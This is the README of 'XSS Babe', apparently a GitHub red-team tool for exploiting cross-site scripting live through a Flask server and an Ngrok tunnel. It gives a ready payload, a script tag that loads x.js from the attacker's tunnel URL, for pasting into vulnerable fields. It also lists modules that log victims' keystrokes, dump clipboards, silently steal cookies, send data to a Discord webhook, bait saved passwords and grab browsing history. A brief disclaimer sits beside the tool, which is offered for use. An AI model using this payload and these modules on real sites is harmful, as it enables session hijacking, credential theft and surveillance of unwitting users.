# XSS BABE 🖤

XSS Babe is a red team tool for exploiting XSS vulnerabilities in real time. It automates payload delivery, logs sessions, and enables live browser-based attacks from a command-line interface. Built for ethical hacking, phishing research, and security education.

---

## ⚠️ Legal Disclaimer

Never use this tool without proper consent. 
 
User assumes all risks when using this tool.

ekomsSavior provides this tool without warranty. 
 

---

##  Installation

**Dependencies (Tested on Kali Linux):**

```bash
sudo apt update
sudo apt install python3 python3-pip unzip -y
pip3 install -r requirements.txt
```

**Install Ngrok:**

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
```

---

##  Ngrok Setup

1. Sign up: https://ngrok.com/signup  
2. Get your auth token: https://dashboard.ngrok.com/get-started/setup  
3. Add it to your config:

```bash
ngrok config add-authtoken YOUR_TOKEN_HERE
```

---

##  Usage

```bash
python3 xss_babe_cli.py
```

### What Happens:

- You enter a vulnerable XSS URL (e.g. `https://vuln.site/?q=`)
- Flask server and Ngrok auto-launch
- Payload is generated with the hosted `x.js`
- CLI menu opens with live attack modules
- All session info is logged to `session_reports/`

---

##  Example Payload

Replace `YOUR_NGROK_URL` with the tunnel shown in the CLI:

```html
<script src="https://YOUR_NGROK_URL/static/x.js"></script>
```

Paste this into any vulnerable parameter, form, or field you control.

---

##  Attack Modules

| Module                   | Description                                         |
|--------------------------|-----------------------------------------------------|
| keylogger                | Records keystrokes live from the victim             |
| clipboard                | Dumps clipboard contents                            |
| auto_cookie_steal        | Steals document cookies silently                    |
| discord_logger           | Sends logs to Discord webhook (edit inside script)  |
| fake_download            | Triggers fake file downloads (ZIP, PDF, etc.)       |
| password_bait            | Displays bait input field to trap saved passwords   |
| history_stealer          | Dumps limited browsing history if accessible        |
| cross_tab_messaging_spy  | Tracks multiple browser tabs or windows             |

---

##  Session Logs

All payloads and events are saved to:

```
session_reports/YYYY-MM-DD-HHMMSS.txt
```

This includes:
- Target URL
- Payload used
- Ngrok tunnel
- Timestamp

---

## Stay Ethical

Never deploy on unauthorized systems.

---

##  Author by [ekomsSavior](https://github.com/ekomsSavior) 🖤
